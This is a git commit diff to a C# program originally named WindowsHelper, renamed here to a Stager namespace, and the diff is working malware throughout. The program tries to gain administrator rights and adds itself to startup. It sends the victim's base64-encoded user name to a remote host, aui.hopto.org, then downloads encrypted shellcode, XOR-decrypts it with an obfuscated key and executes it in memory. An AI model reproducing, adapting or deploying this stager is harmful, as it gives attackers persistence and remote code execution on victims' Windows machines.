6efe6e0e84284fbed476c53716284a4e5472b11b
Sharon <88515352+sharrroooonnnnn@users.noreply.github.com>
2023-03-06 19:57:51 -0500

    New methods and decryptor for key

--- WindowsHelper/Program.cs
+++ WindowsHelper/Program.cs
@@ -1,30 +1,41 @@
-﻿using System.Net;
+using System.Net;
 using System.Runtime.InteropServices;
 
-namespace WindowsHelper
+namespace Stager
 {
     internal class Program
     {
+        delegate void ShellcodeDelegate();
+
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
         static void Main()
         {
-            string shellcodeUrl = "http://aui.hopto.org:5000/encrypted_shellcode.bin";
-            string keyHex = "563c8242";
-
+            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
             CurrentSystem system = new CurrentSystem();
+            
+            string keyHex = system.DecodeString(("?dbd" + "b??dbd?" + "d??9d").Replace("?", ":"));
+            Console.WriteLine(keyHex);
+            string shellcodeUrl = "http://aui.hopto.org/images";
+
             try
             {
                 if (system.IsAdministrator() == false)
                 {
                     system.TryAdmin();
-                    if (system.hasRan() == false)
-                    {
-                        system.AddToStartup();
-                    }
+                    system.AddToStartup();
+                }
+                else
+                {
+                    system.AddToStartup();
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                var a = ex.ToString();
+            }
+            
+
             bool success = false;
             WebClient client = new WebClient();
             byte[] encryptedShellcode = null;
@@ -34,14 +45,15 @@ namespace WindowsHelper
             {
                 try
                 {
-                    encryptedShellcode = client.DownloadData(shellcodeUrl);
+                    var encodedUserName = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userName));
+                    encryptedShellcode = client.DownloadData(shellcodeUrl + "?id=" + encodedUserName);
                     success = true;
 
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine("Could not download: " + ex.Message);
-                    int delay = rand.Next(7000, 11000);
+                    int delay = rand.Next(16000, 40000);
                     System.Threading.Thread.Sleep(delay);
 
                 }
@@ -57,10 +69,27 @@ namespace WindowsHelper
             {
                 shellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);
             }
+
+            /*
             IntPtr shellcodeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
             Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
             Action shellcodeFunc = (Action)Marshal.GetDelegateForFunctionPointer(shellcodeAddr, typeof(Action));
             shellcodeFunc();
+            
+             Old execution method
+             */
+            IntPtr shellcodeAddr = Marshal.AllocHGlobal(shellcode.Length);
+            Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
+
+            // Create delegate to shellcode
+            ShellcodeDelegate shellcodeFunc = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(shellcodeAddr, typeof(ShellcodeDelegate));
+
+            // Invoke shellcode
+            shellcodeFunc();
+
+            // Free allocated memory
+            Marshal.FreeHGlobal(shellcodeAddr);
+
         }
     }
 
